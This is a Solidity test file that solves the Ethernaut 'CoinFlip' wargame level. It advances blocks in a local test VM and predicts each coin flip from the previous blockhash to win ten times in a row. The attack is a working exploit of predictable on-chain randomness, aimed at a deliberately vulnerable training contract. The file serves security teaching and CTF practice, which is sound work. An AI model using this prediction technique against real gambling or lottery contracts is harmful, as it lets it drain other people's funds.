pragma solidity ^0.8.10;

import "ds-test/test.sol";

import "../CoinFlip/CoinFlipFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract CoinFlipTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testCoinFlipHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip ethernautCoinFlip = CoinFlip(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        uint256 blockNum = block.number;

        for (uint256 i = 0; i < 10; i++) {
            blockNum++;
            vm.roll(blockNum);
            emit log_named_uint("block number", block.number);
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip =
                blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
            bool side = coinFlip == 1 ? true : false;

            emit log_named_uint("flip", coinFlip);

            ethernautCoinFlip.flip(coinFlip == 1);
        }

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
